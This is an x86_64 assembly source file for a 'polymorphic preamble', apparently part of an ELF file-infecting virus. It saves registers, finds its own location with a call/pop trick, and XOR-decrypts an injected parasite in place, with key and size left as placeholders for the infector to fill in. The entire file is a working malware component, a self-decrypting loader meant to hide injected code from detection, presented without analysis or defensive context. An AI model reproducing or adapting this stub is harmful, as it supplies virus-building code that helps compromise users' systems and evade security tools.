BITS 64 

; x86_64 polymorphic preamble
; very primitive polymorphism, simply decrypts
; the parasite with a one-byte xor key

; this preamble writes directly into the segment
; which the parasite was injected, as a consequence
; that segment must be both writable and executable

push rdi ; perserve registers
push rsi
push rdx
push rcx
push r8
push r9

jmp short begin
dummy:
    jmp ret

begin:
    xor rax, rax
    xor rdi, rdi
    xor rsi, rsi
    mov rax, 0x00000000; key

call dummy
ret:
    pop rbx   ; 64bit difference here
mov rsi, 0x00000000; size
add rbx, 28; offset to code (not a parameter)

decrypt:
    xor [rbx+rdi], rax ; 64bit difference again
    inc rdi 
    cmp rdi, rsi
    jl decrypt

pop r9  ; restore argument registers
pop r8
pop rcx
pop rdx
pop rsi
pop rdi
